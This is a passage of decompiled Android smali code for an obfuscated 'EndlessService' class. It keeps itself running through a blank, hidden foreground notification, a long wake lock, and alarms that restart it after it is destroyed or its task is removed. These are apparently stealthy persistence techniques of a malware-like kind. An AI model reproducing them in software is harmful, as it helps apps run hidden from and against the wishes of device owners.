    const-class v1, Lcom/cisojemopatude/yazi/nopofoyuwure/kozoxirohizuge;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_4
    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    const-string v0, "intent"

    invoke-static {p1, v0}, Ls0/c;->i(Ljava/lang/Object;Ljava/lang/String;)V

    const-string p1, "EndlessService"

    const-string v0, "Some component want to bind with the service"

    invoke-static {p1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const/4 p1, 0x0

    return-object p1
.end method

.method public onCreate()V
    .locals 7

    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    const-string v0, "EndlessService"

    const-string v1, "The service has been created"

    sget-object v2, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    invoke-virtual {v1, v2}, Ljava/lang/String;->toUpperCase(Ljava/util/Locale;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "(this as java.lang.Strin\u2026.toUpperCase(Locale.ROOT)"

    invoke-static {v1, v2}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 1
    const-string v0, "   "

    const-string v1, "notification"

    invoke-virtual {p0, v1}, Landroid/app/Service;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    const-string v2, "null cannot be cast to non-null type android.app.NotificationManager"

    invoke-static {v1, v2}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;

    check-cast v1, Landroid/app/NotificationManager;

    new-instance v2, Landroid/app/NotificationChannel;

    const-string v3, "   "

    const/4 v4, 0x2

    invoke-direct {v2, v0, v3, v4}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    const-string v3, " "

    invoke-virtual {v2, v3}, Landroid/app/NotificationChannel;->setDescription(Ljava/lang/String;)V

    const/4 v3, 0x0

    invoke-virtual {v2, v3}, Landroid/app/NotificationChannel;->enableLights(Z)V

    const/4 v4, -0x1

    invoke-virtual {v2, v4}, Landroid/app/NotificationChannel;->setLightColor(I)V

    invoke-virtual {v2, v3}, Landroid/app/NotificationChannel;->enableVibration(Z)V

    invoke-virtual {v1, v2}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    new-instance v1, Landroid/content/Intent;

    const-class v2, Lcom/cisojemopatude/yazi/nopofoyuwure/kozoxirohizuge;

    invoke-direct {v1, p0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/16 v2, 0x7b

    invoke-static {p0, v2, v1, v3}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v1

    new-instance v2, Landroid/app/Notification$Builder;

    invoke-direct {v2, p0, v0}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    new-instance v0, Landroid/widget/RemoteViews;

    invoke-virtual {p0}, Landroid/app/Service;->getPackageName()Ljava/lang/String;

    move-result-object v5

    const v6, 0x7f0b001d

    invoke-direct {v0, v5, v6}, Landroid/widget/RemoteViews;-><init>(Ljava/lang/String;I)V

    invoke-virtual {v2, v0}, Landroid/app/Notification$Builder;->setContent(Landroid/widget/RemoteViews;)Landroid/app/Notification$Builder;

    invoke-virtual {v2, v0}, Landroid/app/Notification$Builder;->setCustomContentView(Landroid/widget/RemoteViews;)Landroid/app/Notification$Builder;

    invoke-virtual {v2, v0}, Landroid/app/Notification$Builder;->setCustomBigContentView(Landroid/widget/RemoteViews;)Landroid/app/Notification$Builder;

    invoke-virtual {v2, v4}, Landroid/app/Notification$Builder;->setPriority(I)Landroid/app/Notification$Builder;

    const-string v0, "service"

    invoke-virtual {v2, v0}, Landroid/app/Notification$Builder;->setCategory(Ljava/lang/String;)Landroid/app/Notification$Builder;

    invoke-virtual {v2, v4}, Landroid/app/Notification$Builder;->setVisibility(I)Landroid/app/Notification$Builder;

    invoke-virtual {p0}, Landroid/app/Service;->getResources()Landroid/content/res/Resources;

    move-result-object v0

    const v4, 0x106000d

    invoke-virtual {v0, v4}, Landroid/content/res/Resources;->getColor(I)I

    move-result v0

    invoke-virtual {v2, v0}, Landroid/app/Notification$Builder;->setColor(I)Landroid/app/Notification$Builder;

    const-string v0, "  "

    invoke-virtual {v2, v0}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v0

    const-string v2, "   "

    invoke-virtual {v0, v2}, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v0

    const-string v2, "    "

    invoke-virtual {v0, v2}, Landroid/app/Notification$Builder;->setTicker(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v0

    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentIntent(Landroid/app/PendingIntent;)Landroid/app/Notification$Builder;

    move-result-object v0

    invoke-virtual {v0, v4}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;

    move-result-object v0

    invoke-virtual {v0}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;

    move-result-object v0

    const-string v1, "builder\n            .set\u2026ent)\n            .build()"

    invoke-static {v0, v1}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const/4 v1, 0x1

    .line 2
    invoke-virtual {p0, v1, v0}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V

    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "this.applicationContext"

    invoke-static {v0, v1}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    .line 3
    sput-object v0, Ls0/c;->e:Landroid/content/Context;

    sget-object v1, Ls0/c;->d:Landroid/content/SharedPreferences;

    if-nez v1, :cond_0

    const-string v1, "settings"

    invoke-virtual {v0, v1, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    sput-object v0, Ls0/c;->d:Landroid/content/SharedPreferences;

    :cond_0
    return-void
.end method

.method public onDestroy()V
    .locals 10

    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    const-string v0, "EndlessService"

    const-string v1, "The service has been destroyed"

    sget-object v2, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    invoke-virtual {v1, v2}, Ljava/lang/String;->toUpperCase(Ljava/util/Locale;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "(this as java.lang.Strin\u2026.toUpperCase(Locale.ROOT)"

    invoke-static {v1, v2}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const-wide/16 v7, 0x3e8

    .line 1
    :try_start_0
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/cisojemopatude/yazi/saxotoledewo/vuyoyava;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/16 v1, 0x58

    const/4 v2, 0x0

    invoke-static {p0, v1, v0, v2}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v9

    const-string v0, "alarm"

    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    if-eqz v0, :cond_0

    move-object v3, v0

    check-cast v3, Landroid/app/AlarmManager;

    const/4 v4, 0x0

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    add-long v5, v0, v7

    invoke-virtual/range {v3 .. v9}, Landroid/app/AlarmManager;->setRepeating(IJJLandroid/app/PendingIntent;)V

    goto :goto_0

    :cond_0
    new-instance v0, Ljava/lang/NullPointerException;

    const-string v1, "null cannot be cast to non-null type android.app.AlarmManager"

    invoke-direct {v0, v1}, Ljava/lang/NullPointerException;-><init>(Ljava/lang/String;)V

    throw v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    :goto_0
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 16

    move-object/from16 v8, p0

    invoke-static/range {p3 .. p3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const-string v1, "onStartCommand executed with startId: "

    invoke-static {v1, v0}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "EndlessService"

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 1
    iget-boolean v0, v8, Lcom/cisojemopatude/yazi/nopofoyuwure/kozoxirohizuge;->b:Z

    const/4 v9, 0x1

    if-eqz v0, :cond_0

    goto :goto_0

    :cond_0
    const-string v0, "EndlessService"

    const-string v1, "Starting the foreground service task"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iput-boolean v9, v8, Lcom/cisojemopatude/yazi/nopofoyuwure/kozoxirohizuge;->b:Z

    const-string v0, "power"

    invoke-virtual {v8, v0}, Landroid/app/Service;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "null cannot be cast to non-null type android.os.PowerManager"

    invoke-static {v0, v1}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;

    check-cast v0, Landroid/os/PowerManager;

    const-string v1, "EndlessService::lock"

    invoke-virtual {v0, v9, v1}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v0

    const-wide/32 v1, 0x5265c00

    invoke-virtual {v0, v1, v2}, Landroid/os/PowerManager$WakeLock;->acquire(J)V

    .line 2
    sget-object v0, Lz0/m0;->c:Lz0/m0;

    new-instance v13, Lg0/d;

    const/4 v1, 0x0

    invoke-direct {v13, v8, v1}, Lg0/d;-><init>(Lcom/cisojemopatude/yazi/nopofoyuwure/kozoxirohizuge;Ll0/d;)V

    const/4 v2, 0x3

    const/4 v3, 0x0

    const/4 v4, 0x0

    const/4 v12, 0x0

    const/4 v11, 0x0

    const/4 v14, 0x3

    const/4 v15, 0x0

    move-object v10, v0

    invoke-static/range {v10 .. v15}, Lb/a;->u(Lz0/x;Ll0/f;ILr0/c;ILjava/lang/Object;)Lz0/s0;

    .line 3
    new-instance v13, Lg0/c;

    invoke-direct {v13, v8, v1}, Lg0/c;-><init>(Lcom/cisojemopatude/yazi/nopofoyuwure/kozoxirohizuge;Ll0/d;)V

    move-object v11, v4

    move v14, v2

    move-object v15, v3

    invoke-static/range {v10 .. v15}, Lb/a;->u(Lz0/x;Ll0/f;ILr0/c;ILjava/lang/Object;)Lz0/s0;

    .line 4
    :goto_0
    new-instance v2, Landroid/content/Intent;

    const-class v0, Lcom/cisojemopatude/yazi/saxotoledewo/vuyoyava;

    invoke-direct {v2, v8, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v0, "alarm"

    invoke-virtual {v8, v0}, Landroid/app/Service;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "null cannot be cast to non-null type android.app.AlarmManager"

    invoke-static {v0, v1}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;

    move-object v4, v0

    check-cast v4, Landroid/app/AlarmManager;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v7

    new-instance v10, Lg0/a;

    const/16 v3, 0x4e20

    const-wide/16 v5, 0x2710

    move-object v0, v10

    move-object/from16 v1, p0

    invoke-direct/range {v0 .. v7}, Lg0/a;-><init>(Lcom/cisojemopatude/yazi/nopofoyuwure/kozoxirohizuge;Landroid/content/Intent;ILandroid/app/AlarmManager;JLandroid/os/Looper;)V

    const/4 v0, 0x0

    const-wide/16 v1, 0x0

    invoke-virtual {v10, v0, v1, v2}, Landroid/os/Handler;->sendEmptyMessageDelayed(IJ)Z

    return v9
.end method

.method public onTaskRemoved(Landroid/content/Intent;)V
    .locals 6

    const-string v0, "rootIntent"

    invoke-static {p1, v0}, Ls0/c;->i(Ljava/lang/Object;Ljava/lang/String;)V

    new-instance p1, Landroid/content/Intent;

    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-class v1, Lcom/cisojemopatude/yazi/nopofoyuwure/kozoxirohizuge;

    invoke-direct {p1, v0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/4 v0, 0x1

    const/high16 v1, 0x40000000    # 2.0f

    invoke-static {p0, v0, p1, v1}, Landroid/app/PendingIntent;->getService(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object p1

    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "alarm"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "null cannot be cast to non-null type android.app.AlarmManager"

    invoke-static {v0, v1}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;

    check-cast v0, Landroid/app/AlarmManager;

    const/4 v1, 0x0

    invoke-static {}, Landroid/os/SystemClock;->elapsedRealtime()J

    move-result-wide v2

    const/16 v4, 0x1388

    int-to-long v4, v4

    add-long/2addr v2, v4

    invoke-virtual {v0, v1, v2, v3, p1}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    return-void
.end method
